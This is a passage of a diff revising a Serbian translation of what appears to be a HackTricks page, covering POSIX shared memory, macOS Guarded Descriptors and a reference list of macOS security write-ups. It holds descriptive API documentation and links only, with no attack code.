+**POSIX deljena memorija** omogućava procesima u POSIX-kompatibilnim operativnim sistemima da pristupaju zajedničkoj memorijskoj oblasti, čime se omogućava brža komunikacija u poređenju sa drugim metodama komunikacije između procesa. To podrazumeva kreiranje ili otvaranje objekta deljene memorije pomoću `shm_open()`, podešavanje njegove veličine pomoću `ftruncate()` i mapiranje u adresni prostor procesa korišćenjem `mmap()`. Procesi zatim mogu direktno da čitaju iz ove memorijske oblasti i upisuju u nju. Za upravljanje istovremenim pristupom i sprečavanje oštećenja podataka često se koriste mehanizmi za sinhronizaciju, kao što su mutex-i ili semafori. Na kraju, procesi uklanjaju mapiranje i zatvaraju deljenu memoriju pomoću `munmap()` i `close()`, a opciono uklanjaju objekat memorije pomoću `shm_unlink()`. Ovaj sistem je naročito efikasan za brz i učinkovit IPC u okruženjima u kojima više procesa mora brzo da pristupa deljenim podacima.
 
 <details>
 
@@ -421,7 +421,7 @@ return 0;
 
 <details>
 
-<summary>Primer Consumer koda</summary>
+<summary>Primer koda potrošača</summary>
 ```c
 // gcc consumer.c -o consumer -lrt
 #include <fcntl.h>
@@ -465,23 +465,23 @@ return 0;
 
 ## macOS Guarded Descriptors
 
-**macOSCguarded descriptors** su bezbednosna funkcija uvedena u macOS radi poboljšanja bezbednosti i pouzdanosti **operacija nad deskriptorima datoteka** u korisničkim aplikacijama. Ovi guarded descriptors pružaju način za povezivanje specifičnih ograničenja ili „guard-ova“ sa deskriptorima datoteka, koje kernel primenjuje.
+**macOS Guarded Descriptors** su bezbednosna funkcija uvedena u macOS radi poboljšanja bezbednosti i pouzdanosti **operacija nad deskriptorima datoteka** u korisničkim aplikacijama. Ovi zaštićeni deskriptori pružaju način za povezivanje određenih ograničenja ili „zaštita“ sa deskriptorima datoteka, koja sprovodi kernel.
 
-Ova funkcija je naročito korisna za sprečavanje određenih klasa bezbednosnih ranjivosti, kao što su **neovlašćen pristup datotekama** ili **race conditions**. Do ovih ranjivosti dolazi, na primer, kada thread pristupa file description-u, čime **drugom ranjivom thread-u omogućava pristup**, ili kada **ranjivi child process nasledi** file descriptor. Neke funkcije povezane sa ovom funkcionalnošću su:
+Ova funkcija je posebno korisna za sprečavanje određenih klasa bezbednosnih ranjivosti, kao što su **neovlašćeni pristup datotekama** ili **race conditions**. Ove ranjivosti nastaju, na primer, kada thread pristupa opisu datoteke, čime **drugom ranjivom thread-u omogućava pristup**, ili kada **ranjivi child proces nasledi** deskriptor datoteke. Neke funkcije povezane sa ovom funkcionalnošću su:
 
-- `guarded_open_np`: Otvara FD sa guard-om
+- `guarded_open_np`: Otvara FD sa zaštitom
 - `guarded_close_np`: Zatvara ga
-- `change_fdguard_np`: Menja guard flags na descriptoru (čak i uklanja guard zaštitu)
+- `change_fdguard_np`: Menja zastavice zaštite na deskriptoru (čak i uklanja zaštitu deskriptora)
 
-## Reference
+## References
 
-- [1] [POSIX.1-2024 — Osnovne definicije, pogl. 4 (Dozvole za pristup datotekama, zaštita direktorijuma, razrešavanje putanja)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
-- [2] [`chmod(1)` man stranica](https://keith.github.io/xcode-man-pages/chmod.1.html) (bit za pretragu/izvršavanje direktorijuma, flags za nasleđivanje ACL-ova)
-- [3] [`open(2)` man stranica](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
-- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD bez close-on-exec)
-- [5] [The Eclectic Light Company - Koji file systems i cloud services čuvaju extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
-- [6] [Microsoft - Gatekeeper's Achilles heel: otkrivanje macOS ranjivosti](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
-- [7] [Mickey (Jhftss) - Nova era macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
-- [8] [Kandji - Otkrivanje Apple ranjivosti: diskarbitrationd i storagekitd Audit Story, 1. deo](https://www.kandji.io/blog/macos-audit-story-part1)
+- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
+- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
+- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
+- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
+- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
+- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
+- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)
 
 {{#include ../../../../banners/hacktricks-training.md}}
